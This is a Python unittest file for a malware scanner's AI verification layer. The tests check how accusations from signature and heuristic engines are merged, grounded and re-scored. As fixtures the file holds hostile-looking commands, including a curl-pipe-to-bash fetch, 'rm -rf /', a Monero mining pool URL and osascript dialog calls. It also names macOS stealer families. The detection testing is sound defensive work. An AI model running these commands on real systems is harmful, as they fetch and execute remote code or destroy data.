"""AI accusation verifier: accusations built from the engines' findings, two passes merged with grounding,
points re-weighted per accusation and capped at ±AI_CAP, never final."""
from __future__ import annotations

import unittest

from cerber.engines import ai as A
from cerber.engines.families import candidates

CTX = ("file: x.sh  type: shell\n" + A._EXCERPTS.lstrip("\n") +
       "<<<DATA-1 object=x.sh type=shell>>>\ncurl -s http://x.top/p | bash\nosascript -e 'display dialog'\n<<<END-DATA-1>>>")


def res(verdict: str, score: int, dets: list | None = None) -> dict:
    return {"path": "/x", "verdict": verdict, "score": score, "detections": list(dets or []), "ai_context": CTX}


def det(name: str, conf: str = "HIGH", score: int = 40, engine: str = "heuristic", desc: str = "",
        ev: str = "") -> dict:
    return {"name": name, "confidence": conf, "score": score, "engine": engine, "description": desc,
            "object": "/x", "evidence": [ev] if ev else []}


def acc(name: str, verdict: str, conf: float, score: int = 40, engine: str = "heuristic",
        strength: str = "HIGH") -> dict:
    return {"id": "A1", "name": name, "engine": engine, "strength": strength, "score": score, "verdict": verdict,
            "confidence": conf, "agree": True, "grounded": True, "quote": "curl", "reason_pl": "x", "points": 0}


def answer(accs: list, match: str = "different", conf: float = 0.0, family: str | None = None) -> dict:
    return {"mode": "verify", "accusations": accs, "family_match": match, "family": family, "confidence": conf,
            "category": "stealer", "choice": "other", "summary_pl": "x"}


class CandidatesTest(unittest.TestCase):
    def test_families_from_signature_names(self):
        opts = candidates([det("ClamAV:Osx.Trojan.Amos-9958390-0", "CERTAIN", 100, "clamav"),
                           det("community:MacOS_Infostealer_Atomic_8d1d", engine="yara"),
                           det("MalwareBazaar.Banshee", "CERTAIN", 100, "hash")])
        ids = [o["id"] for o in opts]
        self.assertEqual(ids[0], "amos")
        self.assertIn("banshee", ids)
        self.assertEqual(ids[-2:], ["other", "benign"])

    def test_ai_detections_ignored(self):
        self.assertEqual([o["id"] for o in candidates([det("AI:Family.AMOS", engine="ai")])], ["other", "benign"])


class AccusationsTest(unittest.TestCase):
    def test_certain_and_fixed_engines_are_facts(self):
        accs, facts = A.accusations(res("SUSPICIOUS", 60, [
            det("ClamAV:Osx.Trojan.Amos-1", "CERTAIN", 100, "clamav"),
            det("Cerber:Exact_Family", "CERTAIN", 100, "yara"),
            det("ThreatFox.amos", "HIGH", 60, "ioc"),
            det("Heur:SHELL.PipeToShell", "HIGH", 30, ev="curl -s http://x.top/p | bash"),
            det("YARA:Gen_Dropper", "MEDIUM", 25, "yara", ev="$a@3: b'| bash'"),
            det("AI:Verify", "LOW", -5, "ai")]))
        self.assertEqual([a["name"] for a in accs], ["Heur:SHELL.PipeToShell", "YARA:Gen_Dropper"])
        self.assertEqual([a["id"] for a in accs], ["A1", "A2"])
        self.assertEqual(accs[1]["matched"], "| bash")                    # YARA evidence prefix stripped
        self.assertEqual(len(facts), 3)

    def test_duplicates_merged_and_limited(self):
        dets = [det("Heur:A", score=10), det("Heur:A", score=30)] + [det(f"Heur:B{i}", "LOW", i) for i in range(20)]
        accs, _ = A.accusations(res("SUSPICIOUS", 60, dets))
        self.assertEqual(accs[0]["score"], 30)
        self.assertEqual(len(accs), A.MAX_ACCUSATIONS)

    def test_nothing_to_judge_no_ai(self):
        self.assertFalse(A.wants_ai(res("SUSPICIOUS", 40, [det("ClamAV:X", "CERTAIN", 100, "clamav")]), True))
        self.assertTrue(A.wants_ai(res("SUSPICIOUS", 40, [det("Heur:X")])))


class MergeTest(unittest.TestCase):
    ACCS = [{"id": "A1", "name": "Heur:SHELL.PipeToShell", "engine": "heuristic", "strength": "HIGH", "score": 30},
            {"id": "A2", "name": "Heur:Miner", "engine": "heuristic", "strength": "HIGH", "score": 40}]
    FAMS = [{"id": "amos", "name": "Atomic macOS Stealer (AMOS)", "category": "stealer", "cited": 1}]

    def ans(self, v1, c1, q1, v2, c2, q2, match="similar", fam="amos", fc=0.8):
        return {"accusations": {"A1": {"quote": q1, "reason_pl": "r1", "verdict": v1, "confidence": c1},
                                "A2": {"quote": q2, "reason_pl": "r2", "verdict": v2, "confidence": c2}},
                "family": fam, "family_match": match, "family_confidence": fc, "summary_pl": "s"}

    def test_agreeing_grounded_answers(self):
        a = self.ans("confirmed", 0.9, "curl -s http://x.top/p | bash", "refuted", 0.8, "osascript -e")
        b = self.ans("confirmed", 0.8, "curl -s  http://X.top/p | bash", "refuted", 0.9, "osascript -e")
        m = A.merge_passes(a, b, self.ACCS, self.FAMS, CTX)
        self.assertEqual([(x["verdict"], x["confidence"]) for x in m["accusations"]],
                         [("confirmed", 0.85), ("refuted", 0.85)])
        self.assertTrue(all(x["grounded"] for x in m["accusations"]))
        self.assertEqual((m["family_match"], m["family"], m["choice"]), ("similar", "Atomic macOS Stealer (AMOS)", "amos"))

    def test_flip_halves_and_ungrounded_costs(self):
        a = self.ans("confirmed", 0.9, "curl -s http://x.top/p | bash", "refuted", 0.9, "steals bitcoin wallets")
        b = self.ans("refuted", 0.6, "curl", "refuted", 0.9, "steals bitcoin wallets", match="benign", fam="none")
        m = A.merge_passes(a, b, self.ACCS, self.FAMS, CTX)
        x1, x2 = m["accusations"]
        self.assertEqual((x1["verdict"], x1["confidence"], x1["agree"]), ("confirmed", 0.45, False))
        self.assertEqual((x2["verdict"], x2["confidence"], x2["grounded"]), ("refuted", 0.54, False))
        self.assertFalse(m["agree"])
        self.assertEqual(m["confidence"], 0.4)

    def test_refuting_text_that_is_not_there_counts_as_grounded(self):
        accs = [dict(self.ACCS[1], matched="stratum+tcp://pool.minexmr.com:4444"), dict(self.ACCS[0], matched="| bash")]
        a = {"accusations": {"A2": {"quote": "stratum+tcp://pool", "reason_pl": "r", "verdict": "refuted", "confidence": 0.9},
                             "A1": {"quote": "nope nope", "reason_pl": "r", "verdict": "refuted", "confidence": 0.9}},
             "family": "none", "family_match": "benign", "family_confidence": 0.9, "summary_pl": "s"}
        m = A.merge_passes(a, a, accs, self.FAMS, CTX)
        self.assertEqual([(x["grounded"], x["confidence"]) for x in m["accusations"]], [(True, 0.9), (False, 0.54)])

    def test_quotes_only_from_file_content(self):
        ctx = "file: a  type: shell\nindicators:\n  url: http://evil.top" + A._EXCERPTS + "<<<DATA>>>\necho hi\n"
        self.assertFalse(A._grounded_quote("http://evil.top", A._content(ctx)))
        self.assertTrue(A._grounded_quote("echo hi", A._content(ctx)))
        self.assertEqual(A._grounded(["echo  HI", "rm -rf /"], ctx), 0.5)

    def test_family_must_not_contradict_accusations(self):
        a = self.ans("confirmed", 0.9, "curl -s http://x.top/p | bash", "confirmed", 0.9, "osascript -e",
                     match="benign", fam="none", fc=1.0)
        m = A.merge_passes(a, a, self.ACCS, self.FAMS, CTX)
        self.assertEqual((m["family_match"], m["confidence"], m["verdict"]), ("different", 0.5, "malicious"))

    def test_same_family_needs_a_family(self):
        a = self.ans("unsure", 0.5, "", "unsure", 0.5, "", match="same", fam="none")
        m = A.merge_passes(a, a, self.ACCS, self.FAMS, CTX)
        self.assertEqual((m["family_match"], m["choice"], m["family"]), ("different", "other", None))


class PolicyTest(unittest.TestCase):
    def test_refuted_loses_at_most_half(self):
        r = res("SUSPICIOUS", 45, [det("Heur:HTML.ClickFixClipboard", score=45)])
        A.apply_ai(r, answer([acc("Heur:HTML.ClickFixClipboard", "refuted", 0.9, 45)], "benign", 0.9))
        self.assertEqual(r["ai"]["accusations"][0]["points"], -22)
        self.assertEqual((r["ai"]["points_raw"], r["ai"]["points"]), (-22, -15))     # capped
        self.assertEqual((r["verdict"], r["score"]), ("INFO", 30))                  # never CLEAN
        self.assertEqual(r["detections"][-1]["name"], "AI:Verify.Refuted")
        self.assertIn("ograniczone do -15", r["detections"][-1]["description"])

    def test_weak_refutation_quarter_and_low_confidence_nothing(self):
        r = res("SUSPICIOUS", 70, [det("Heur:A", score=40), det("Heur:B", "MEDIUM", 30)])
        A.apply_ai(r, answer([acc("Heur:A", "refuted", 0.6, 40), acc("Heur:B", "refuted", 0.5, 30)]))
        self.assertEqual([a["points"] for a in r["ai"]["accusations"]], [-10, 0])
        self.assertEqual((r["verdict"], r["score"]), ("SUSPICIOUS", 60))

    def test_never_below_info_never_clean(self):
        r = res("INFO", 12, [det("Heur:A", "LOW", 12)])
        A.apply_ai(r, answer([acc("Heur:A", "refuted", 1.0, 12, strength="LOW")], "benign", 1.0))
        self.assertEqual((r["verdict"], r["score"]), ("INFO", 6))

    def test_confirmed_gains_a_little(self):
        r = res("SUSPICIOUS", 40, [det("Heur:A", score=40)])
        A.apply_ai(r, answer([acc("Heur:A", "confirmed", 0.9, 40)]))
        self.assertEqual((r["ai"]["accusations"][0]["points"], r["score"]), (8, 48))
        r = res("SUSPICIOUS", 40, [det("Heur:A", score=100)])
        A.apply_ai(r, answer([acc("Heur:A", "confirmed", 0.9, 100)]))
        self.assertEqual(r["ai"]["accusations"][0]["points"], A.AI_CONFIRM_MAX)

    def test_total_raise_capped_and_family(self):
        dets = [det(f"Heur:{i}", score=45) for i in range(4)]
        r = res("SUSPICIOUS", 70, dets)
        A.apply_ai(r, answer([acc(f"Heur:{i}", "confirmed", 0.95, 45) for i in range(4)], "same", 0.9,
                             "Atomic macOS Stealer (AMOS)"))
        self.assertEqual((r["ai"]["points_raw"], r["ai"]["points"]), (37, 15))
        self.assertEqual((r["verdict"], r["score"]), ("MALICIOUS", 85))
        self.assertEqual(r["family"], "Atomic macOS Stealer (AMOS)")
        self.assertEqual(r["detections"][-1]["name"], "AI:Family.AtomicmacOSStealer")

    def test_weak_family_not_named(self):
        r = res("SUSPICIOUS", 65, [det("Heur:A", score=35), det("Heur:B", score=30)])
        A.apply_ai(r, answer([acc("Heur:A", "confirmed", 0.99, 35), acc("Heur:B", "confirmed", 0.97, 30)],
                             "similar", 0.4, "Silver Sparrow"))
        self.assertEqual((r["score"], r["detections"][-1]["name"]), (78, "AI:Verify.Confirmed"))
        self.assertNotIn("family", r)
        self.assertIn("niepewne", r["detections"][-1]["description"])

    def test_malicious_needs_strong_static(self):
        weak = res("SUSPICIOUS", 70, [det("Heur:A", "MEDIUM", 25)])
        A.apply_ai(weak, answer([acc("Heur:A", "confirmed", 0.95, 25, strength="MEDIUM")], "same", 0.95, "AMOS"))
        self.assertEqual(weak["verdict"], "SUSPICIOUS")
        low = res("SUSPICIOUS", 60, [det("Heur:A", score=45)])
        A.apply_ai(low, answer([acc("Heur:A", "confirmed", 0.95, 45)], "same", 0.95, "AMOS"))
        self.assertEqual((low["verdict"], low["score"]), ("SUSPICIOUS", 73))     # static < 65

    def test_no_static_evidence_no_flag(self):
        r = res("CLEAN", 0)
        A.apply_ai(r, answer([], "same", 0.99, "AMOS"))
        self.assertEqual((r["verdict"], r["score"]), ("CLEAN", 5))              # family alone: a note at most

    def test_certain_malicious_pua_untouched(self):
        for v, dets in (("MALICIOUS", [det("Heur:X", score=90)]),
                        ("SUSPICIOUS", [det("ClamAV:Osx.A", "CERTAIN", 100, "clamav"), det("Heur:X", score=40)]),
                        ("PUA", [det("Heur:Adware", score=40)])):
            r = res(v, 90, dets)
            A.apply_ai(r, answer([acc("Heur:X", "refuted", 0.99, 90)], "benign", 0.99))
            self.assertEqual((r["verdict"], r["score"]), (v, 90))
            self.assertEqual(r["ai"]["accusations"][0]["points"], 0)

    def test_fixed_engines_never_reweighted(self):
        r = res("SUSPICIOUS", 50, [det("ThreatFox.x", "HIGH", 50, "ioc")])
        A.apply_ai(r, answer([acc("ThreatFox.x", "refuted", 0.99, 50, engine="ioc")]))
        self.assertEqual((r["verdict"], r["score"]), ("SUSPICIOUS", 50))

    def test_unsure_has_no_points(self):
        r = res("INFO", 30, [det("Heur:A", "MEDIUM", 30)])
        A.apply_ai(r, answer([acc("Heur:A", "unsure", 0.9, 30)]))
        self.assertEqual((r["verdict"], r["score"]), ("INFO", 30))
        self.assertIn("bez zmiany punktów", r["detections"][-1]["description"])
        self.assertNotIn("family", r)


if __name__ == "__main__":
    unittest.main()
